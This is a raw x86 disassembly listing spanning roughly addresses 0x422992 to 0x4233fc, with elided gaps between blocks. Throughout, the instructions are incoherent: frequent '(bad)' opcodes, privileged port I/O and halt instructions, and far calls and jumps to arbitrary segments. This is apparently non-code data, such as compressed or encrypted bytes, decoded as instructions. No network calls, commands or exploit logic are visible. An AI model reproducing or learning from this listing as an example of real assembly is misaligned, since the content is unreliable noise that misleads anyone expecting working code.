  422992:	and    DWORD PTR [edi],edx
  422994:	dec    esi
  422995:	mov    ds,edx
  422997:	push   es
  422998:	fst    QWORD PTR [eax-0x77737c0b]
  42299e:	addr16 dec esi
  4229a0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4229a1:	fnstcw WORD PTR [eax+0x29]
  4229a4:	pop    ebp
  4229a5:	or     ebx,DWORD PTR [edx+0x7fb18950]
  4229ab:	inc    eax
  4229ac:	adc    esi,DWORD PTR [esi+0x15a77bc9]
  4229b2:	repnz inc edx
  4229b4:	xor    eax,0x0
	...
  422a15:	add    BYTE PTR [esi-0x377e796],dl
  422a1b:	cli    
  422a1c:	xchg   esi,eax
  422a1d:	jle    0x422a63
  422a1f:	rol    ecx,1
  422a21:	call   0x5ee4348
  422a26:	cmp    BYTE PTR [eax+0x1],dh
  422a29:	add    BYTE PTR [edi],al
  422a2b:	add    DWORD PTR [eax],eax
  422a2d:	add    ch,cl
  422a2f:	pop    edi
  422a30:	jae    0x422a32
  422a32:	and    eax,0xe3463466
  422a37:	or     al,0xed
  422a39:	or     bh,BYTE PTR [eax-0x56]
  422a3c:	push   ss
  422a3d:	or     DWORD PTR [ecx],edx
  422a3f:	mov    ds,WORD PTR [edx-0x2c]
  422a42:	mov    esp,0xd09adb9a
  422a47:	arpl   sp,bp
  422a49:	rol    BYTE PTR [ebp+0x35],0x36
  422a4d:	das    
  422a4e:	mov    edx,0xd9b6518f
  422a53:	jnp    0x4229db
  422a55:	xchg   al,cl
  422a57:	jne    0x422a8a
  422a59:	out    dx,al
  422a5a:	fldcw  WORD PTR ds:[edx+ecx*4+0xa]
  422a5f:	jne    0x422a57
  422a61:	scas   eax,DWORD PTR es:[edi]
  422a62:	out    0x39,al
  422a64:	xchg   ecx,eax
  422a65:	mov    dl,BYTE PTR [ebp+0x78]
  422a68:	push   eax
  422a69:	mov    BYTE PTR [edi-0x1ddb9472],cl
  422a6f:	test   DWORD PTR [esi-0x11b740ae],edx
  422a75:	jbe    0x422a54
  422a77:	cmc    
  422a78:	or     DWORD PTR [edx-0x52],0xd8ed3e99
  422a7f:	jnp    0x422ab9
  422a81:	push   ebp
  422a82:	jnp    0x422a47
  422a84:	lock jo 0x422ab1
  422a87:	ins    DWORD PTR es:[edi],dx
  422a88:	div    BYTE PTR [eax+0x7b701e3f]
  422a8e:	adc    ebx,DWORD PTR [edx]
  422a90:	jno    0x422a25
  422a92:	cs enter 0x6a4b,0x55
  422a97:	test   BYTE PTR [ebx],dl
  422a99:	cmp    DWORD PTR [ebp+0x65],eax
  422a9c:	rol    DWORD PTR [edx-0x6f2f4911],cl
  422aa2:	gs fcomp st(5)
  422aa5:	and    bl,ch
  422aa7:	daa    
  422aa8:	and    al,0x2d
  422aaa:	sahf   
  422aab:	jle    0x422ab2
  422aad:	(bad)  
  422aae:	xchg   edx,eax
  422aaf:	sbb    BYTE PTR [esi+0xd],dl
  422ab2:	daa    
  422ab3:	outs   dx,BYTE PTR ds:[esi]
  422ab4:	hlt    
  422ab5:	test   edx,esp
  422ab7:	sub    ah,dl
  422ab9:	mov    dh,0x1d
  422abb:	jmp    0x5293cc38
  422ac0:	scas   al,BYTE PTR es:[edi]
  422ac1:	jae    0x422a8c
  422ac3:	or     DWORD PTR [edi],edi
  422ac5:	cmp    edi,esi
  422ac7:	repz lds ebp,FWORD PTR [esi-0x3b06348d]
  422ace:	aas    
  422acf:	dec    edx
  422ad0:	mov    eax,0x9e62d3a0
  422ad5:	scas   al,BYTE PTR es:[edi]
  422ad6:	sbb    cl,BYTE PTR [esi-0x26]
  422ad9:	fldcw  WORD PTR [eax+0x4c]
  422adc:	and    bl,BYTE PTR [ecx-0x4a]
  422adf:	xchg   ebp,eax
  422ae0:	out    0x82,eax
  422ae2:	and    edx,0x3319c2ae
  422ae8:	retf   0x90db
  422aeb:	out    dx,eax
  422aec:	xchg   esp,eax
  422aed:	add    al,0x39
  422aef:	shl    DWORD PTR [eax],1
  422af1:	repnz mov al,0x22
  422af4:	test   BYTE PTR [ebp+0x3a452736],cl
  422afa:	sbb    DWORD PTR [ebp+0x47dd02bd],eax
  422b00:	lods   al,BYTE PTR ds:[esi]
  422b01:	jp     0x422b11
  422b03:	dec    edi
  422b04:	nop
  422b05:	mov    BYTE PTR [ecx+edi*4],dh
  422b08:	or     al,0x83
  422b0a:	pop    esi
  422b0b:	clc    
  422b0c:	lock inc edx
  422b0e:	mov    dh,0x3f
  422b10:	dec    ebx
  422b11:	and    DWORD PTR [edi+0x20],edx
  422b14:	pushf  
  422b15:	ins    BYTE PTR es:[edi],dx
  422b16:	loopne 0x422b76
  422b18:	stc    
  422b19:	sbb    ebx,edi
  422b1b:	in     al,0x0
  422b1d:	call   0x2d661729
  422b22:	jb     0x422afe
  422b24:	jbe    0x422b29
  422b26:	mov    BYTE PTR [ebx-0x3c],cl
  422b29:	adc    ecx,DWORD PTR [ebx+0x4e]
  422b2c:	lahf   
  422b2d:	jbe    0x422ae0
  422b2f:	pop    eax
  422b30:	lods   eax,DWORD PTR ds:[esi]
  422b31:	cmc    
  422b32:	push   ecx
  422b33:	jl     0x422ba7
	...
  422b95:	add    BYTE PTR [edi+esi*1+0x4a],al
  422b99:	fwait
  422b9a:	jnp    0x422b9b
  422b9c:	aad    0xff
  422b9e:	push   cs
  422b9f:	adc    ebx,DWORD PTR [ecx-0x765759e4]
  422ba5:	lock aas 
  422ba7:	jno    0x422baa
  422ba9:	add    BYTE PTR [edi],al
  422bab:	add    DWORD PTR [eax],eax
  422bad:	add    BYTE PTR [ebx],bl
  422baf:	cmp    BYTE PTR [esi],0x9e
  422bb2:	icebp  
  422bb3:	xor    DWORD PTR [esi+0x53cbdfe],ebx
  422bb9:	ds stos DWORD PTR es:[edi],eax
  422bbb:	lea    ecx,[edx]
  422bbd:	mov    DWORD PTR [ecx],ebx
  422bbf:	inc    esi
  422bc0:	mov    bh,0xb6
  422bc2:	fld    TBYTE PTR [edi+0x38]
  422bc5:	les    edi,FWORD PTR [ebx+0x8]
  422bc8:	xor    DWORD PTR [eiz*4+0x2587c128],eax
  422bcf:	xchg   edx,eax
  422bd0:	hlt    
  422bd1:	push   ds
  422bd2:	shl    bl,0xde
  422bd5:	pusha  
  422bd6:	ret    
  422bd7:	adc    al,0xa
  422bd9:	js     0x422b69
  422bdb:	mov    eax,0x86f8f78a
  422be0:	sar    DWORD PTR [ebp+0x5e6d3e87],1
  422be6:	mov    al,0x98
  422be8:	mov    ch,0x38
  422bea:	or     bl,ch
  422bec:	outs   dx,BYTE PTR ds:[esi]
  422bed:	jmp    0xca5f60b3
  422bf2:	jbe    0x422b7b
  422bf4:	mov    esi,0xe094afa0
  422bf9:	push   0x27
  422bfb:	pop    esi
  422bfc:	jns    0x422c71
  422bfe:	call   0xe715:0x5ff21fee
  422c05:	and    eax,0x282b59aa
  422c0a:	fstp   DWORD PTR [edx]
  422c0c:	psrld  mm0,QWORD PTR [eax+0x4ab36cdb]
  422c13:	dec    edi
  422c14:	loop   0x422c45
  422c16:	hlt    
  422c17:	cmp    cl,BYTE PTR [esi+0x4]
  422c1a:	mov    esi,0xd2b342ef
  422c1f:	imul   esi,DWORD PTR [edi-0x15739e96],0xa4f7f6c
  422c29:	out    dx,eax
  422c2a:	ret    
  422c2b:	push   ecx
  422c2c:	lods   eax,DWORD PTR ds:[esi]
  422c2d:	lock test al,0x4e
  422c30:	or     edx,DWORD PTR [edi+edi*1+0x76a22d1b]
  422c37:	ret    
  422c38:	inc    ecx
  422c39:	aaa    
  422c3a:	ror    BYTE PTR [esi-0x574d51c5],cl
  422c40:	sbb    eax,DWORD PTR [ecx-0x38081507]
  422c46:	push   eax
  422c47:	int3   
  422c48:	popf   
  422c49:	fs xchg ecx,eax
  422c4b:	in     al,dx
  422c4c:	clc    
  422c4d:	dec    esi
  422c4e:	mov    esi,0x4d22847b
  422c53:	adc    bh,BYTE PTR [ebp+0x57]
  422c56:	push   es
  422c57:	ds fcos 
  422c5a:	std    
  422c5b:	(bad)  
  422c5c:	in     eax,0x5b
  422c5e:	pop    esp
  422c5f:	test   eax,0xd40fc627
  422c64:	mov    ecx,0xb579cac0
  422c69:	jge    0x422c5c
  422c6b:	mov    esi,0xf75dd494
  422c70:	xchg   ecx,eax
  422c71:	and    edx,0xffffffda
  422c74:	mov    bl,0xcc
  422c76:	mov    esi,0xe7c75de9
  422c7b:	or     al,0x9e
  422c7d:	sub    ebp,DWORD PTR [edx]
  422c7f:	popa   
  422c80:	sahf   
  422c81:	rcl    BYTE PTR [eax],0x39
  422c84:	lods   eax,DWORD PTR ds:[esi]
  422c85:	aas    
  422c86:	jns    0x422c94
  422c88:	out    dx,eax
  422c89:	hlt    
  422c8a:	pop    esp
  422c8b:	push   edx
  422c8c:	xor    al,0x98
  422c8e:	sbb    ecx,edi
  422c90:	test   WORD PTR [ebx+0x11],0xefd
  422c96:	cli    
  422c97:	add    ebx,DWORD PTR [edi+ebp*8+0x5e7f826d]
  422c9e:	imul   edx,DWORD PTR [ebx-0x36],0x1d
  422ca2:	or     ebx,0xffffffcb
  422ca5:	aas    
  422ca6:	sahf   
  422ca7:	in     al,0xb6
  422ca9:	test   eax,0xbf48dc00
  422cae:	or     bh,BYTE PTR [ebp-0x457d72fa]
  422cb4:	and    al,0x0
	...
  422d16:	mov    edi,0x626d60bd
  422d1b:	std    
  422d1c:	mov    edi,0x26c593ff
  422d21:	ffreep st(7)
  422d23:	dec    esp
  422d24:	fmul   st(6),st
  422d26:	inc    esi
  422d27:	jb     0x422d2a
  422d29:	add    BYTE PTR [edi],al
  422d2b:	add    DWORD PTR [eax],eax
  422d2d:	add    ah,dl
  422d2f:	stos   BYTE PTR es:[edi],al
  422d30:	out    0xb8,eax
  422d32:	push   edx
  422d33:	push   eax
  422d34:	scas   al,BYTE PTR es:[edi]
  422d35:	mov    esp,0xbc5a892c
  422d3a:	xor    eax,0x57289bff
  422d3f:	jne    0x422d5e
  422d41:	std    
  422d42:	dec    ebx
  422d43:	(bad)  
  422d44:	sti    
  422d45:	cwde   
  422d46:	add    DWORD PTR [ebx-0xb],edx
  422d49:	jmp    0x5d64b7c4
  422d4e:	dec    esp
  422d4f:	add    al,0x58
  422d51:	call   0x7da52cab
  422d56:	inc    eax
  422d57:	push   esi
  422d58:	popf   
  422d59:	test   eax,0x6f31d7a4
  422d5e:	out    dx,eax
  422d5f:	clc    
  422d60:	jbe    0x422da6
  422d62:	mov    ch,0x91
  422d64:	and    dh,0x5a
  422d67:	pop    edx
  422d68:	xchg   edx,eax
  422d69:	scas   al,BYTE PTR es:[edi]
  422d6a:	scas   eax,DWORD PTR es:[edi]
  422d6b:	sbb    bl,bh
  422d6d:	dec    edi
  422d6e:	mov    cl,0xc4
  422d70:	loope  0x422dac
  422d72:	xor    ebp,DWORD PTR [ecx-0xd]
  422d75:	lods   eax,DWORD PTR ds:[esi]
  422d76:	ds mov eax,0x3d51637c
  422d7c:	push   0x86050681
  422d81:	push   ecx
  422d82:	(bad)  
  422d83:	pop    ecx
  422d84:	xchg   al,al
  422d86:	mov    ebp,0x53771d32
  422d8b:	popf   
  422d8c:	sbb    DWORD PTR [eax],esp
  422d8e:	das    
  422d8f:	sbb    ebp,DWORD PTR [edx+0xd]
  422d92:	or     al,0x54
  422d94:	aam    0xd1
  422d96:	xchg   BYTE PTR ss:[ecx-0x9aca7bc],dl
  422d9d:	ror    BYTE PTR [esi-0x9],cl
  422da0:	mov    cl,0xee
  422da2:	dec    ecx
  422da3:	mov    ch,0x3e
  422da5:	push   ss
  422da6:	fbld   TBYTE PTR [eax-0x9]
  422da9:	add    ebp,DWORD PTR [ebp+0x27]
  422dac:	add    DWORD PTR [edx+0x287a4ab5],ebp
  422db2:	dec    ebp
  422db3:	mov    dl,0xe3
  422db5:	cli    
  422db6:	ins    DWORD PTR es:[edi],dx
  422db7:	ja     0x422dd5
  422db9:	lods   eax,DWORD PTR ds:[esi]
  422dba:	jno    0x422e14
  422dbc:	lahf   
  422dbd:	div    BYTE PTR [ecx-0x5f315ee8]
  422dc3:	dec    ebx
  422dc4:	stos   BYTE PTR es:[edi],al
  422dc5:	sub    al,0xaf
  422dc7:	pop    edx
  422dc8:	stc    
  422dc9:	jmp    0x422dcb
  422dcb:	mov    ah,0x80
  422dcd:	mov    ds:0x56d6acf0,eax
  422dd2:	inc    ebp
  422dd3:	mov    esi,esi
  422dd5:	jmp    0x9696:0x564b092e
  422ddc:	rcl    DWORD PTR [ebp-0x4d],0x6c
  422de0:	inc    esi
  422de1:	leave  
  422de2:	push   cs
  422de3:	mov    ebx,0x5722d11c
  422de8:	(bad)  
  422de9:	daa    
  422dea:	test   BYTE PTR [esi-0x1e5fc5c1],cl
  422df0:	cli    
  422df1:	sub    DWORD PTR [eax+edi*2-0x2d],edi
  422df5:	repnz mov esi,0x50e0c40e
  422dfb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422dfc:	call   0xbf43:0xb859fd61
  422e03:	call   0xd422:0x31502949
  422e0a:	sub    al,BYTE PTR [edx*2+0x2c04753a]
  422e11:	push   edx
  422e12:	test   al,0x12
  422e14:	jo     0x422e22
  422e16:	dec    esp
  422e17:	dec    edx
  422e18:	jmp    0x422d9a
  422e1a:	mov    eax,ds:0xc3fe68b9
  422e1f:	sti    
  422e20:	fld    TBYTE PTR ds:0x821278b3
  422e26:	mov    edx,0x35dab989
  422e2b:	fidiv  DWORD PTR [eax-0x5036a0c6]
  422e31:	or     dh,0x3f
  422e34:	push   ds
	...
  422e95:	add    BYTE PTR [ebx-0x21e677ab],al
  422e9b:	fst    QWORD PTR [ebx+0x2a9187df]
  422ea1:	mov    ebx,0x4b230ba8
  422ea6:	dec    ebp
  422ea7:	jae    0x422eaa
  422ea9:	add    BYTE PTR [edi],al
  422eab:	add    DWORD PTR [eax],eax
  422ead:	add    BYTE PTR [edi-0x185b258],ah
  422eb3:	mov    dl,0xdd
  422eb5:	dec    ecx
  422eb6:	jp     0x422e9e
  422eb8:	jecxz  0x422f0d
  422eba:	pop    bp
  422ebc:	daa    
  422ebd:	outs   dx,DWORD PTR ds:[esi]
  422ebe:	stos   BYTE PTR es:[edi],al
  422ebf:	out    0x7,eax
  422ec1:	(bad)  [ecx+ebp*1]
  422ec4:	imul   DWORD PTR [esi+0x21]
  422ec7:	ins    WORD PTR es:[edi],dx
  422ec9:	jne    0x422eb5
  422ecb:	cmp    ebx,0xffffffdb
  422ece:	inc    ebp
  422ecf:	pop    ss
  422ed0:	imul   dl
  422ed2:	adc    DWORD PTR ds:0x3a4d585a,esp
  422ed8:	ss xchg edi,eax
  422eda:	hlt    
  422edb:	cmp    DWORD PTR [ebx-0x1013d0e3],0xffffffc3
  422ee2:	fnsave [ecx]
  422ee4:	pop    ecx
  422ee5:	nop
  422ee6:	mov    ebp,0x29f861b
  422eeb:	jnp    0x422eab
  422eed:	inc    ebx
  422eee:	sub    edx,DWORD PTR [esi-0x5c00d59e]
  422ef4:	dec    esi
  422ef5:	test   BYTE PTR [ebx+0x41d45c09],ch
  422efb:	cld    
  422efc:	mov    cl,0x47
  422efe:	xchg   esp,eax
  422eff:	adc    al,0xf
  422f01:	mov    ds:0x2e261275,al
  422f06:	fdivrp st(1),st
  422f08:	xchg   ecx,eax
  422f09:	sbb    eax,0x399303d8
  422f0e:	arpl   bp,sp
  422f10:	push   cs
  422f11:	or     cl,BYTE PTR [esi+0x6206a2a2]
  422f17:	ja     0x422eda
  422f19:	adc    eax,0x9855529a
  422f1e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422f1f:	aam    0xad
  422f21:	add    edi,0xf0ce4616
  422f27:	inc    BYTE PTR ds:0x9efca534
  422f2d:	fist   DWORD PTR [edi+edx*2+0x1c090ba9]
  422f34:	loopne 0x422ecd
  422f36:	mov    DWORD PTR [edx-0x4c],esp
  422f39:	xchg   esp,esi
  422f3b:	out    dx,eax
  422f3c:	scas   eax,DWORD PTR es:[edi]
  422f3d:	dec    edx
  422f3e:	mov    ds:0x2707ff76,eax
  422f43:	cmp    ebx,DWORD PTR [ecx-0x51ade90c]
  422f49:	cmp    edi,ecx
  422f4b:	jae    0x422ef7
  422f4d:	pop    esp
  422f4e:	adc    eax,0x133f5cee
  422f53:	test   DWORD PTR [esi+0x6b],esp
  422f56:	xor    eax,0x916a821f
  422f5b:	xchg   BYTE PTR [ebx-0x51956159],dl
  422f61:	or     ch,dl
  422f63:	mov    edx,esp
  422f65:	ds nop
  422f67:	cli    
  422f68:	add    al,0x1f
  422f6a:	mov    esp,0x4fae6b7f
  422f6f:	inc    eax
  422f70:	jne    0x422f53
  422f72:	dec    ecx
  422f73:	or     eax,0xa49f48a6
  422f78:	adc    eax,0x4f5f9a19
  422f7d:	add    DWORD PTR [ebx],eax
  422f7f:	mov    al,0x25
  422f81:	(bad)
  422f84:	icebp  
  422f85:	frstor ss:[edi+0x59]
  422f89:	addr16 sub al,0x49
  422f8c:	inc    edi
  422f8d:	inc    edi
  422f8e:	jnp    0x422f79
  422f90:	mov    cl,0x52
  422f92:	aam    0x9e
  422f94:	or     eax,0x51ee2ef2
  422f99:	dec    eax
  422f9a:	mov    eax,0xac598965
  422f9f:	mov    bh,0x35
  422fa1:	push   0xffffff94
  422fa3:	sub    al,0x38
  422fa5:	mov    cl,0xe4
  422fa7:	imul   eax,edi,0xffffffd3
  422faa:	rol    BYTE PTR [ecx+0x38bdf332],1
  422fb0:	adc    ch,BYTE PTR [edi+0x64]
  422fb3:	int3   
  422fb4:	mov    ah,0x0
	...
  423016:	inc    esi
  423017:	in     al,0x62
  423019:	mov    dl,ah
  42301b:	mov    gs,esi
  42301d:	out    dx,al
  42301e:	lahf   
  42301f:	aaa    
  423020:	inc    ebp
  423021:	or     DWORD PTR [esi+0x54f0c789],ebp
  423027:	je     0x42302a
  423029:	add    BYTE PTR [edi],al
  42302b:	add    DWORD PTR [eax],eax
  42302d:	add    BYTE PTR [edx+ecx*2+0x617b2e18],dh
  423034:	jmp    0x153c:0x765eb5e8
  42303b:	sbb    edi,DWORD PTR [eax+0x7004cb90]
  423041:	imul   ebp,esp,0x923da420
  423047:	loope  0x4230c8
  423049:	cld    
  42304a:	mov    ecx,0xa4e25d59
  42304f:	hlt    
  423050:	(bad)  
  423051:	xchg   ebp,eax
  423052:	pop    ecx
  423053:	ret    
  423054:	xor    ecx,DWORD PTR [ebp-0x66ac65f8]
  42305a:	mov    ecx,DWORD PTR [esp+esi*1]
  42305d:	xlat   BYTE PTR ds:[ebx]
  42305e:	repnz cmp ebx,edi
  423061:	outs   dx,DWORD PTR ds:[esi]
  423062:	jl     0x423044
  423064:	imul   eax,ebx,0xffffffb6
  423067:	popf   
  423068:	icebp  
  423069:	jg     0x4230be
  42306b:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  42306d:	jmp    0xf5fbd73f
  423072:	mov    edx,0x57a7b7f4
  423077:	pop    ebp
  423078:	repz add BYTE PTR [ebx+0x12dc8003],dl
  42307f:	retf   
  423080:	and    edx,DWORD PTR [ecx-0x62]
  423083:	xor    ecx,DWORD PTR [esi]
  423085:	int    0x74
  423087:	and    BYTE PTR es:[eax+0x1be95f14],ch
  42308e:	fs inc ebx
  423090:	jl     0x42301e
  423092:	or     DWORD PTR [esi],ecx
  423094:	fidivr WORD PTR [ebx]
  423096:	sub    dh,BYTE PTR [eax+0x1c49c5a2]
  42309c:	dec    eax
  42309d:	mov    ecx,0x457f151e
  4230a2:	fadd   QWORD PTR [edi+esi*8+0x5]
  4230a6:	fcomi  st,st(5)
  4230a8:	ins    DWORD PTR es:[edi],dx
  4230a9:	fs ja  0x4230fd
  4230ac:	cmp    BYTE PTR [ebp-0x4b],bl
  4230af:	mov    cl,0x3f
  4230b1:	xor    BYTE PTR [ecx-0x64101006],dl
  4230b7:	es leave 
  4230b9:	and    bl,dl
  4230bb:	cmp    eax,0xdee5c57f
  4230c0:	adc    DWORD PTR [esi+0x6f],esp
  4230c3:	add    eax,0xb6d82018
  4230c8:	sub    al,0xae
  4230ca:	sbb    edx,ecx
  4230cc:	arpl   WORD PTR [edx],ax
  4230ce:	call   0x3ac47e07
  4230d3:	iret   
  4230d4:	lock fdiv DWORD PTR [edx-0x38d5a30e]
  4230db:	mul    BYTE PTR [ebp+0x4a]
  4230de:	out    0xb6,eax
  4230e0:	inc    esi
  4230e1:	dec    esi
  4230e2:	xchg   edi,eax
  4230e3:	push   cs
  4230e4:	xor    BYTE PTR [ecx],0x1d
  4230e7:	pop    eax
  4230e8:	imul   edx,esi,0xffffffc8
  4230eb:	ja     0x4230b9
  4230ed:	test   BYTE PTR [esi],dh
  4230ef:	sub    DWORD PTR [ecx-0x26],0xa83aee9d
  4230f6:	rcl    BYTE PTR [ebx+0x73],cl
  4230f9:	adc    eax,DWORD PTR [edx+edi*1+0x26]
  4230fd:	test   dh,0x1c
  423100:	jge    0x423135
  423102:	int3   
  423103:	xor    DWORD PTR [ebx-0x7991573a],ebx
  423109:	jmp    FWORD PTR [esi+0x24]
  42310c:	in     eax,dx
  42310d:	pop    es
  42310e:	or     al,0x46
  423110:	js     0x4230ad
  423112:	mov    WORD PTR [ecx-0xb],cs
  423115:	lods   al,BYTE PTR ds:[esi]
  423116:	mov    al,0x29
  423118:	pop    ebx
  423119:	out    0x85,al
  42311b:	jecxz  0x42312e
  42311d:	dec    eax
  42311e:	int3   
  42311f:	in     eax,dx
  423120:	xchg   ebp,eax
  423121:	in     eax,dx
  423122:	adc    BYTE PTR [edi+0x2bdda9cd],ah
  423128:	jle    0x423126
  42312a:	dec    edi
  42312b:	push   0x5deb39cf
  423130:	xor    ax,0xd334
  423134:	jmp    0x0:0x0
	...
  423193:	add    BYTE PTR [eax],al
  423195:	add    BYTE PTR [ecx-0xf],bh
  423198:	div    DWORD PTR [ecx-0x6804801]
  42319e:	dec    edi
  42319f:	jno    0x423168
  4231a1:	cmp    BYTE PTR [ebx],0xf8
  4231a4:	pop    edi
  4231a5:	xchg   ecx,eax
  4231a6:	pop    ebx
  4231a7:	jne    0x4231aa
  4231a9:	add    BYTE PTR [edi],al
  4231ab:	add    DWORD PTR [eax],eax
  4231ad:	add    BYTE PTR [eax+eiz*1-0xf],ch
  4231b1:	imul   esp,DWORD PTR ds:0x343b2338,0xffffffb1
  4231b8:	jecxz  0x423178
  4231ba:	sbb    cl,BYTE PTR [edi]
  4231bc:	push   edx
  4231bd:	xor    eax,DWORD PTR [ecx]
  4231bf:	(bad)  
  4231c0:	retf   0x53c6
  4231c3:	dec    edi
  4231c4:	in     eax,0x3a
  4231c6:	leave  
  4231c7:	push   eax
  4231c8:	sub    al,0xa4
  4231ca:	cmp    al,0xb8
  4231cc:	dec    edx
  4231cd:	aas    
  4231ce:	das    
  4231cf:	or     BYTE PTR [esi],0xe7
  4231d2:	or     edi,esp
  4231d4:	and    eax,0xa8a42690
  4231d9:	dec    ebp
  4231da:	xor    eax,0xda269582
  4231df:	scas   eax,DWORD PTR es:[edi]
  4231e0:	adc    DWORD PTR ds:0x4a892011,0x8
  4231e7:	xchg   ecx,eax
  4231e8:	mov    DWORD PTR [edi],esi
  4231ea:	push   ss
  4231eb:	and    DWORD PTR [ebx],0x65
  4231ee:	xchg   esi,eax
  4231ef:	sbb    DWORD PTR [ecx-0x11f22293],esi
  4231f5:	add    al,0x50
  4231f7:	mov    al,0x5d
  4231f9:	nop
  4231fa:	test   al,0x30
  4231fc:	jp     0x4231e2
  4231fe:	ror    dl,cl
  423200:	dec    edx
  423201:	and    al,0x6c
  423203:	lods   eax,DWORD PTR ds:[esi]
  423204:	(bad)  
  423205:	xchg   ecx,eax
  423206:	inc    ebx
  423207:	push   edi
  423208:	add    eax,ecx
  42320a:	inc    esi
  42320b:	pusha  
  42320c:	test   eax,0x75044587
  423211:	and    dl,BYTE PTR [ebx-0x3333a7a0]
  423217:	stos   BYTE PTR es:[edi],al
  423218:	dec    eax
  423219:	stos   DWORD PTR es:[edi],eax
  42321a:	inc    ebx
  42321b:	xor    al,0x38
  42321d:	mov    esi,0x5b21561f
  423222:	or     BYTE PTR [eax-0x5d],dl
  423225:	cmp    BYTE PTR [esi+edx*8],bh
  423228:	sbb    BYTE PTR [edx-0x5b98d829],al
  42322e:	adc    ch,BYTE PTR [eax+0x662d2444]
  423234:	in     eax,dx
  423235:	xor    ch,BYTE PTR ds:0x3a03a25f
  42323b:	xor    ah,ah
  42323d:	ss cmc 
  42323f:	(bad)  
  423240:	lods   eax,DWORD PTR ds:[esi]
  423241:	test   eax,0x17affb7c
  423246:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423247:	push   edx
  423248:	rcl    DWORD PTR [edi],0x1f
  42324b:	fcmovbe st,st(0)
  42324d:	(bad)  
  42324e:	jmp    DWORD PTR [ebx+0x7c0007b6]
  423254:	retf   0x8d68
  423257:	jno    0x4232c3
  423259:	test   DWORD PTR [edx],eax
  42325b:	sub    DWORD PTR [ebp-0x8],esi
  42325e:	dec    ebp
  42325f:	jo     0x423293
  423261:	outs   dx,DWORD PTR ds:[esi]
  423262:	cmc    
  423263:	push   cs
  423264:	inc    ebx
  423265:	pop    esi
  423266:	clc    
  423267:	pop    esp
  423268:	lahf   
  423269:	lea    ebp,[ebx]
  42326b:	ss xchg ebp,eax
  42326d:	push   ebx
  42326e:	icebp  
  42326f:	leave  
  423270:	xchg   ecx,eax
  423271:	cmc    
  423272:	rcr    ebx,cl
  423274:	loop   0x4232f2
  423276:	shr    esp,1
  423278:	fs dec eax
  42327a:	pop    esi
  42327b:	addr16 enter 0xc1c9,0xc
  423280:	dec    ecx
  423281:	ja     0x4232e7
  423283:	cmp    dh,BYTE PTR [ebp+0x7ce53564]
  423289:	inc    ecx
  42328a:	add    eax,0x19be3f6c
  42328f:	sbb    al,0xce
  423291:	mov    ds:0xb7732df2,eax
  423296:	push   eax
  423297:	(bad)  
  423298:	iret   
  423299:	and    BYTE PTR [ebx-0x420652b1],bl
  42329f:	loope  0x4232a5
  4232a1:	sbb    bh,BYTE PTR [edi-0x2a]
  4232a4:	dec    esi
  4232a5:	scas   al,BYTE PTR es:[edi]
  4232a6:	pop    ss
  4232a7:	call   0x35b0:0x9b0c6b0b
  4232ae:	xchg   edx,eax
  4232af:	jl     0x4232ae
  4232b1:	lds    edi,FWORD PTR [edi+0xc728]
	...
  423313:	add    BYTE PTR [eax],al
  423315:	add    al,bh
  423317:	fisub  WORD PTR [edx+0x30]
  42331a:	mov    sp,0xdefa
  42331e:	xchg   edi,eax
  42331f:	inc    esp
  423320:	lock (bad) 
  423322:	mov    esi,0x62804592
  423327:	jbe    0x42332a
  423329:	add    BYTE PTR [edi],al
  42332b:	add    DWORD PTR [eax],eax
  42332d:	add    BYTE PTR [edi-0x3c],al
  423330:	inc    eax
  423331:	push   es
  423332:	push   0xf7f32349
  423337:	pop    edi
  423338:	test   al,bh
  42333a:	inc    eax
  42333b:	inc    ebp
  42333c:	shl    cl,cl
  42333e:	in     al,0xc7
  423340:	stos   DWORD PTR es:[edi],eax
  423341:	es scas al,BYTE PTR es:[edi]
  423343:	and    ch,BYTE PTR [eax-0x4d]
  423346:	je     0x4232f4
  423348:	(bad)  
  423349:	aam    0xa8
  42334b:	add    eax,0xa30c8101
  423350:	repnz fiadd DWORD PTR [ebp-0x786f41a2]
  423357:	pop    eax
  423358:	lock pop esp
  42335a:	pop    es
  42335b:	sub    esp,DWORD PTR [edx-0x31]
  42335e:	dec    esp
  42335f:	mov    edx,0x3c41012a
  423364:	sbb    BYTE PTR [edx-0x63],ch
  423367:	out    0xfd,al
  423369:	sub    bl,BYTE PTR [ebp+eax*2-0x7d]
  42336d:	fcmovne st,st(1)
  42336f:	ss jb  0x4233bb
  423372:	jnp    0x42332d
  423374:	add    BYTE PTR [esi-0x5f52f553],cl
  42337a:	ror    BYTE PTR [edi+0x72],0x6
  42337e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42337f:	xlat   BYTE PTR ds:[ebx]
  423380:	sbb    BYTE PTR [edi-0x3b654bf2],0x51
  423387:	mov    al,BYTE PTR [eax+0x3971122f]
  42338d:	(bad)  
  42338e:	push   edx
  42338f:	push   ecx
  423390:	mov    edx,0x47a5bf1f
  423395:	lods   eax,DWORD PTR ds:[esi]
  423396:	shl    DWORD PTR ds:0x4aed1dc9,0x71
  42339d:	sub    dl,BYTE PTR ds:[edx-0x14]
  4233a1:	jno    0x423354
  4233a3:	call   0x26012301
  4233a8:	mov    eax,0x8ff98c0f
  4233ad:	pop    es
  4233ae:	mov    ds:0x9aa53329,al
  4233b3:	push   cs
  4233b4:	(bad)  
  4233b5:	dec    esp
  4233b6:	frstor ds:0x444f85a3
  4233bc:	rcr    DWORD PTR [ebx+0x6f8b4156],0x62
  4233c3:	mov    bl,0x22
  4233c5:	mov    WORD PTR [ecx+esi*8],?
  4233c8:	and    eax,eax
  4233ca:	retf   
  4233cb:	or     ah,BYTE PTR [edx]
  4233cd:	pop    eax
  4233ce:	mov    al,0x3e
  4233d0:	or     al,0x5e
  4233d2:	into   
  4233d3:	mov    ebx,0x49052c8f
  4233d8:	mov    BYTE PTR [esi+0x62],al
  4233db:	and    esp,DWORD PTR [eax+esi*1-0x5c]
  4233df:	jecxz  0x423387
  4233e1:	inc    eax
  4233e2:	xchg   esp,eax
  4233e3:	paddusb mm5,QWORD PTR [esi+0xd9c62be]
  4233ea:	ds adc bl,bh
  4233ed:	out    dx,eax
  4233ee:	sbb    bl,BYTE PTR [ebp-0x59f6a7d9]
  4233f4:	clc    
  4233f5:	jle    0x423394
  4233f7:	loopne 0x423410
  4233f9:	into   
  4233fa:	dec    edx
  4233fb:	aas    
  4233fc:	es iret 
